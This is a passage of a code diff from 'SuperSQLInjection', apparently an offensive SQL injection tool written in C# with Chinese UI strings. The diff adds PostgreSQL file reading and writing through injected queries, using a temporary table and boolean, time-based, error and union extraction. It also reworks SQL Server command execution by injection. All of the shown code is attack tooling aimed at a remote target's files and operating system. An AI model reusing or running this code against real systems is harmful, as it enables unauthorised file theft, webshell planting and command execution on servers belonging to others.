-                String payload = SQLServer.witeFileBySP_MakeWebTask.Replace("{path}", Tools.strToHex(path, "GB2312")).Replace("{data}", Tools.strToHex(this.file_txt_result.Text, "GB2312"));
-                HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, payload, config.request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);
-                MessageBox.Show("大侠，写文件操作小的我已经完成了额，剩下的就请大侠人工检查写文件是否成功！");
-            }
-            else if (this.file_cbox_readWrite.SelectedIndex == 4)
-            {
-                //backup database写文件
-                String payload = SQLServer.witeFileByBackDataBase.Replace("{path}", Tools.strToHex(path, "GB2312")).Replace("{data}", Tools.strToHex(this.file_txt_result.Text, "GB2312"));
-                HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, payload, config.request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);
-                MessageBox.Show("大侠，写文件操作小的我已经完成了额，剩下的就请大侠人工检查写文件是否成功！");
-            }
-            else if (this.file_cbox_readWrite.SelectedIndex == 5)
-            {
-                //filesystemobject读文件
-                String payload = SQLServer.readFileByFileSystemobject.Replace("{path}", path);
-                HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, payload, config.request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);
-                switch (config.injectType)
-                {
-                    case InjectType.Bool:
-
-                        //取每一列的值
-                        data_payload = SQLServer.file_content;
-                        String payload_len = SQLServer.bool_dataLength.Replace("{data}", data_payload);
-                        int len = 0;
-                        if (config.keyType.Equals(KeyType.Time))
+                        //写文件
+                        if (!String.IsNullOrEmpty(this.file_txt_result.Text))
                         {
-                            len = getValue(SQLServer.getBoolDataBySleep(payload_len, config.maxTime), 0, 1024 * 100);
-                        }
-                        else {
-                            len = getValue(payload_len, 0, 1024 * 100);
-                        }
                             
-                        ver_tmp = new String[len];
-                        this.dataCount = len;
-                        this.Invoke(new showLogDelegate(log), "SQLServer读到文件内容，长度为" + len + "字节！", LogLevel.info);
-                        //获取值
-                        for (int i = 1; i <= len; i++)
-                        {
-                            stp.QueueWorkItem<object>(getFileContentBySQLServer, i);
-                            this.currentDataCount = i;
+                            String[] lines = this.file_txt_result.Lines;
+                            //创建表
+                            HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, PostgreSQL.createTable, config.request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);
+
+                            foreach (String line in lines) {
+                                //插入每一行数据
+                                if (!String.IsNullOrEmpty(line)) {
+                                    HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, PostgreSQL.getInsertLineValue(line), config.request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);
+                                }
+                                String payload = PostgreSQL.createTable;
+                                }
+
+                            HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, PostgreSQL.getWriteFilePayload(path), config.request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);
+                            MessageBox.Show("大侠，写文件操作小的我已经完成了额，剩下的就请大侠人工检查写文件是否成功！");
                         }
-                        stp.WaitForIdle();
-                        break;
+                        else
+                        {
+                            MessageBox.Show("请在下面输入您要写入文件的内容，请注意，GET方式的注入提交数据不能超过1024个字节！");
+                        }
+                       
+                    }
+                    else if (this.file_cbox_readWrite.SelectedIndex == 2)
+                    {
+                        //读文件
 
-                    case InjectType.Union:
+                        String payload = PostgreSQL.getReadFilePayload(path);
+                        HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, payload, config.request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);
+                        switch (config.injectType)
+                        {
+                            case InjectType.Bool:
 
-                        String unionresult = getOneDataByUnionOrError(SQLServer.getUnionDataValue(config.columnsCount, config.showColumn, config.unionFill, SQLServer.file_content));
-                        this.Invoke(new StringDelegate(file_txt_resultSetText), unionresult);
-                        this.Invoke(new showLogDelegate(log), "获取到SQLServer读取的文件内容，长度为" + unionresult.Length + "字节！", LogLevel.info);
-                        break;
-                    case InjectType.Error:
+                               try {
+                                    String count_payload = PostgreSQL.bool_data.Replace("{data}", PostgreSQL.file_content_Count);
+                                    int count = 0;
+                                    if (KeyType.Time.Equals(config.keyType))
+                                    {
+                                        count = getValueByStepUp(PostgreSQL.getBoolDataBySleep(PostgreSQL.file_content_Count, config.maxTime), 0, 50);
+                                    }
+                                    else
+                                    {
+                                        count = getValueByStepUp(count_payload, 0, 50);
+                                    }
 
-                        String errorresult = getOneDataByUnionOrError(SQLServer.error_value.Replace("{data}", SQLServer.file_content));
-                        this.Invoke(new StringDelegate(file_txt_resultSetText), errorresult);
-                        this.Invoke(new showLogDelegate(log), "获取到SQLServer读取的文件内容，长度为" + errorresult.Length + "字节！", LogLevel.info);
-                        break;
-                }
+                                    for (int i = 0; i < count; i++)
+                                    {
+                                        data_payload = PostgreSQL.file_content_data.Replace("{index}", i + "");
+
+                                        String payload_len_data = PostgreSQL.char_length.Replace("{data}", data_payload);
+                                        String payload_len = PostgreSQL.bool_data.Replace("{data}", payload_len_data);
+                                        int len = 0;
+                                        if (KeyType.Time.Equals(config.keyType))
+                                        {
+                                            len = getValueByStepUp(PostgreSQL.getBoolDataBySleep(payload_len_data, config.maxTime), 0, 100);
+                                        }
+                                        else
+                                        {
+                                            len = getValueByStepUp(payload_len, 0, 100);
+                                        }
+                                        this.dataCount = len;
+                                        ver_tmp = new String[len];
+                                        //获取值
+                                        for (int j = 1; j <= len; j++)
+                                        {
+                                            String dtmp_payload = PostgreSQL.bool_value.Replace("{data}", data_payload).Replace("{index}", j + "");
+                                            stp.QueueWorkItem<string>(getFileContentBoolByPostgreSQL, dtmp_payload + "#" + j);
+                                            stp.WaitFor(100);
+
+                                        }
+                                        stp.WaitForIdle();
+                                        this.dataCount = len;
+                                        this.file_txt_result.AppendText(HttpUtility.HtmlDecode(Tools.StringArrayToString(ver_tmp)) + "\r\n");
+                                        this.Invoke(new showLogDelegate(log), "报告大侠，获取到文件第" + i+1 + "行数据！", LogLevel.info);
+                                    }
+                                    this.Invoke(new showLogDelegate(log), "报告大侠，读取文件内容完成！", LogLevel.info);
+                                }catch (Exception e)
+                                {
+                                    this.Invoke(new showLogDelegate(log), "读取文件内容发生异常：" + e.Message, LogLevel.error);
+                                }
+                                break;
+
+                            case InjectType.Error:
+
+                                String lineCount = getOneDataByUnionOrError(PostgreSQL.error_value.Replace("{data}", PostgreSQL.file_content_Count));
+                                this.dataCount = Tools.convertToInt(lineCount);
+                                this.Invoke(new showLogDelegate(log), "报告大侠，读到文件内容，共有" + Tools.convertToInt(lineCount) + "行数据！", LogLevel.success);
+                                //注意下标从1开始
+                                ver_tmp = new String[this.dataCount];
+                                for (int i = 0; i < this.dataCount; i++)
+                                {
+
+                                    //按照一行的一列一列开始获取
+                                    stp.QueueWorkItem<int>(getFileContentErrorByPostgreSQL, i);
+                                    stp.WaitFor(100);
+                                }
+                                stp.WaitForIdle();
+                                String result = Tools.convertToString(ver_tmp,true);
+                                this.Invoke(new StringDelegate(file_txt_resultSetText), result);
+                                this.Invoke(new showLogDelegate(log), "获取到读取的文件内容，长度为" + result.Length + "字节！", LogLevel.info);
+                                break;
+                            case InjectType.Union:
+                                String elineCount = getOneDataByUnionOrError(PostgreSQL.getUnionDataValue(config.columnsCount,config.showColumn, PostgreSQL.file_content_Count,"","",""));
+                                this.dataCount = Tools.convertToInt(elineCount);
+                                this.Invoke(new showLogDelegate(log), "报告大侠，读到文件内容，共有" + Tools.convertToInt(elineCount) + "行数据！", LogLevel.success);
+                                //注意下标从1开始
+                                ver_tmp = new String[this.dataCount];
+                                for (int i = 0; i < this.dataCount; i++)
+                                {
+
+                                    //按照一行的一列一列开始获取
+                                    stp.QueueWorkItem<int>(getFileContentUnionByPostgreSQL, i);
+                                    stp.WaitFor(100);
+                                }
+                                stp.WaitForIdle();
+                                String eresult = Tools.convertToString(ver_tmp,true);
+                                this.Invoke(new StringDelegate(file_txt_resultSetText), eresult);
+                                this.Invoke(new showLogDelegate(log), "获取到读取的文件内容，长度为" + eresult.Length + "字节！", LogLevel.info);
+                                break;
+
+                        }
+                        //删除临时表
+                        HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, PostgreSQL.drop_table, config.request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);
+                        this.Invoke(new showLogDelegate(log), "删除临时表，完成！", LogLevel.info);
+
+                    }
+
+                    break;
             }
-            this.file_btn_start.Text = "开始";
+
+            this.file_btn_start.Enabled = true;
             status = 0;
 
         }
-
-        public void getFileContentBySQLServer(Object index)
+        /// <summary>
+        /// SQLServer获取文件数据
+        /// </summary>
+        /// <param name="index"></param>
+        public void getFileContentBoolBySQLServer(Object index)
         {
             try
             {
@@ -6776,6 +6996,120 @@ namespace SuperSQLInjection
             }
         }
 
+        /// <summary>
+        /// PostgreSQL获取文件数据
+        /// </summary>
+        /// <param name="index"></param>
+        public void getFileContentBoolByPostgreSQL(Object param)
+        {
+            try
+            {
+                String[] ps = param.ToString().Split('#');
+                int index = int.Parse(ps[1].ToString());
+                String tmp_va_payload =  ps[0];
+                //取unicode转换后的长度
+                String unicode_data_len_payload = PostgreSQL.bool_length.Replace("{data}", tmp_va_payload); ;
+                int unicode_data_len = 0;
+                if (config.keyType.Equals(KeyType.Time))
+                {
+                    unicode_data_len = getValue(PostgreSQL.getBoolDataBySleep(unicode_data_len_payload, config.maxTime), 1, 8);
+                }
+                else
+                {
+                    unicode_data_len = getValue(PostgreSQL.bool_data.Replace("{data}", unicode_data_len_payload), 1, 8);
+                }
+
+                //长度范围2-8支持大部分语言
+
+                int m_index = 1;
+                StringBuilder unicodes = new StringBuilder();
+
+                String value = "";
+
+                while (m_index <= unicode_data_len)
+                {
+                    //获取多字节
+                    String substr_payload = PostgreSQL.bool_value.Replace("{data}", tmp_va_payload).Replace("{index}", m_index.ToString());
+                    //单个unicode值范围是0-9
+                    int unicode = 0;
+                    if (config.keyType.Equals(KeyType.Time))
+                    {
+                        unicode = getValue(PostgreSQL.getBoolDataBySleep(substr_payload, config.maxTime), 48, 57);
+                    }
+                    else
+                    {
+                        unicode = getValue(PostgreSQL.bool_data.Replace("{data}",substr_payload), 48, 57);
+                    }
+                    char ascii = (char)unicode;
+                    unicodes.Append(ascii);
+                    m_index++;
+
+                }
+                int eunicode = Tools.convertToInt(unicodes.ToString());
+                if (eunicode <= 255)
+                {
+                    value += (char)eunicode;
+                }
+                else
+                {
+                    value += Tools.unHexByUnicode(eunicode, config.readFileEncoding);
+                }
+                ver_tmp[int.Parse(index.ToString()) - 1] = value;
+                m_index++;
+
+            }
+            catch (Exception e)
+            {
+
+                Tools.SysLog("获取读到的文件内容发生错误！" + e.Message);
+            }
+        }
+
+
+        /// <summary>
+        /// 获取数据PostgreSQL，error方式,这个长度有一定限制
+        /// </summary>
+        /// <param name="index">参数第几行，0开始</param>
+        public void getFileContentErrorByPostgreSQL(int index)
+        {
+            try
+            {
+                ListViewItem lvi = new ListViewItem();
+                String result = getOneDataByUnionOrError(PostgreSQL.error_value.Replace("{data}", PostgreSQL.file_content_data.Replace("{index}",index+"")));
+                result = HttpUtility.HtmlDecode(result);
+                ver_tmp[index] = result;
+                this.Invoke(new showLogDelegate(log), "读取到文件第"+index+"行内容，长度"+ result.Length+ "！", LogLevel.info);
+
+            }
+            catch (Exception e)
+            {
+
+                this.Invoke(new showLogDelegate(log), "获取值发生异常：" + e.Message, LogLevel.error);
+            }
+        }
+
+        /// <summary>
+        /// 获取数据PostgreSQL，error方式,这个长度有一定限制
+        /// </summary>
+        /// <param name="index">参数第几行，0开始</param>
+        public void getFileContentUnionByPostgreSQL(int index)
+        {
+            try
+            {
+                ListViewItem lvi = new ListViewItem();
+                String result = getOneDataByUnionOrError(PostgreSQL.getUnionDataValue(config.columnsCount,config.showColumn, PostgreSQL.file_content_data,"","",index+""));
+                result = HttpUtility.HtmlDecode(result);
+                ver_tmp[index] = result;
+                this.Invoke(new showLogDelegate(log), "读取到文件第" + index + "行内容，长度" + result.Length + "！", LogLevel.info);
+
+            }
+            catch (Exception e)
+            {
+
+                this.Invoke(new showLogDelegate(log), "获取值发生异常：" + e.Message, LogLevel.error);
+            }
+        }
+
         public void readOrWriteFileByMySQLByHexAscii(Object param)
         {
             String[] ps = param.ToString().Split('#');
@@ -6799,6 +7133,7 @@ namespace SuperSQLInjection
             Interlocked.Increment(ref this.currentDataCount);
         }
 
+
         public void execCMDBySQLServerByUnicode(Object param)
         {
 
@@ -6814,7 +7149,7 @@ namespace SuperSQLInjection
             {
                 len = getValue(SQLServer.bool_length.Replace("{data}", ps[0]), 0, 8);
             }
-            
+
 
             int cindex = 1;
             String temUnicode = "";
@@ -6831,7 +7166,7 @@ namespace SuperSQLInjection
                 {
                     ascii = getValue(tmp_payload, 0, 9);
                 }
-               
+
                 temUnicode += ascii.ToString();
                 cindex++;
             }
@@ -6854,7 +7189,7 @@ namespace SuperSQLInjection
                 String cmd = this.cmd_txt_cmd.Text;
                 String cmd_16 = Tools.strToHex(cmd, "GB2312");
                 //执行cmd
-                String cmd_data_payload = SQLServer.createTable.Replace("{cmd}", cmd_16);
+                String cmd_data_payload = SQLServer.createTableAndExecCmd.Replace("{cmd}", cmd_16);
                 //修正payload
                 int ssindex = config.request.IndexOf("<Encode>");
                 int seindex = config.request.IndexOf("</Encode>");
@@ -6865,7 +7200,7 @@ namespace SuperSQLInjection
                 }
                 //修正payload
                 //String cmdrequest = Regex.Replace(config.request, "\\<Encode\\>(.*?)\\<\\/Encode\\>", "<Encode>#inject#</Encode>");
-
+                HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, SQLServer.dropTable, config.request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);
                 HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, cmd_data_payload, config.request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);
                 this.Invoke(new showLogDelegate(log), "报告大侠，CMD命令执行完成，正在等待获取执行结果！", LogLevel.info);
                 if (config.showCmdResult)
@@ -6909,7 +7244,7 @@ namespace SuperSQLInjection
                                     //获取值
                                     for (int j = 1; j <= len; j++)
                                     {
-                                        String dtmp_payload = SQLServer.unicode_value.Replace("{data}", data_payload).Replace("{index}", j + "");
+                                        String dtmp_payload = PostgreSQL.bool_value.Replace("{data}", data_payload).Replace("{index}", j + "");
                                         stp.QueueWorkItem<string>(execCMDBySQLServerByUnicode, dtmp_payload + "#" + j);
                                         stp.WaitFor(100);
 
@@ -7002,7 +7337,7 @@ namespace SuperSQLInjection
 
                 this.Invoke(new showLogDelegate(log), "执行命令获取结果发生异常：" + e.Message, LogLevel.error);
             }
-            this.cmd_btn_start.Text = "开始";
+            this.cmd_btn_start.Enabled =true;
             status = 0;
         }
 
@@ -7011,7 +7346,7 @@ namespace SuperSQLInjection
         {
             if (status == 0)
             {
-                if (config.dbType.Equals(DBType.MySQL) || config.dbType.Equals(DBType.SQLServer))
+                if (this.file_cbox_readWrite.SelectedIndex>0)
                 {
                     if (String.IsNullOrEmpty(this.file_txt_filePath.Text))
                     {
@@ -7033,20 +7368,20 @@ namespace SuperSQLInjection
                         return;
                     }
                     status = 1;
-                    this.file_btn_start.Text = "停止";
+                    this.file_btn_start.Enabled = false;
                     this.currentThread = new Thread(readOrWriteFile);
                     this.currentThread.Start();
                 }
                 else
                 {
-                    MessageBox.Show("抱歉，文件读写目前只支持MySQL和SQLServer，并且账户拥有文件读写权限！");
+                    MessageBox.Show("抱歉，没有选择读写文件方式或此数据库不支持文件读写！");
                 }
             }
             else
             {
 
                 StopThread();
-                this.file_btn_start.Text = "开始";
+                this.file_btn_start.Enabled = true;
             }
 
         }
@@ -7070,7 +7405,7 @@ namespace SuperSQLInjection
                     }
 
                     status = 1;
-                    this.cmd_btn_start.Text = "结束";
+                    this.cmd_btn_start.Enabled = false;
                     this.cmd_txt_result.Clear();
                     this.currentThread = new Thread(execCMDBySQLServer);
                     this.currentThread.Start();
@@ -7083,7 +7418,6 @@ namespace SuperSQLInjection
             else
             {
                 StopThread();
-                this.cmd_btn_start.Text = "开始";
             }
         }
 
@@ -7278,6 +7612,12 @@ namespace SuperSQLInjection
                     case 5:
                         md5();
                         break;
+                    case 6:
+                        this.encode_txt_result.Text = Tools.strToChrOrChar(encode,"chr"," ", "UTF-8");
+                        break;
+                    case 7:
+                        this.encode_txt_result.Text = Tools.strToChrOrChar(encode, "char", " ", "UTF-8");
+                        break;
 
                 }
             }
@@ -7335,6 +7675,12 @@ namespace SuperSQLInjection
                         log("---------------正在查找www.pmd5.com------------------", LogLevel.info);
                         this.encode_txt_result.Text += "www.pmd5.cm查询结果：" + OnlineMD5.decodeMD5_pmd5_com(this.encode_txt_input.Text);
                         break;
+                    case 6:
+                        this.encode_txt_result.Text = Tools.chrOrCharToStr(decode,"chr", "UTF-8");
+                        break;
+                    case 7:
+                        this.encode_txt_result.Text = Tools.chrOrCharToStr(decode, "char", "UTF-8");
+                        break;
 
                 }
             }
@@ -7348,6 +7694,8 @@ namespace SuperSQLInjection
         {
 
             //判断关键字,body中的词
+            //记录trueServer状态码，后面判断，降低误报
+            config.injectHTTPCode = trueServer.code;
             String key = Tools.findKeyByStr(trueServer.body, falseServer.body, oldServer.body);
             this.chk_inject_reverseKey.Checked = false;
             //如果为空反过来查找
@@ -8623,6 +8971,26 @@ namespace SuperSQLInjection
                     log("删除选择记录失败！--" + ep.Message, LogLevel.waring);
                 }
             }
+        }
+
+        private void cmd_btn_stop_Click(object sender, EventArgs e)
+        {
+            if (status != 0)
+            {
+                StopThread();
+                this.cmd_btn_start.Enabled = true;
+            }
+        }
+
+        private void file_btn_stop_Click(object sender, EventArgs e)
+        {
+            if (status != 0)
+            {
+
+                StopThread();
+                this.file_btn_start.Enabled = true;
+            }
+            
         }
     }
 }
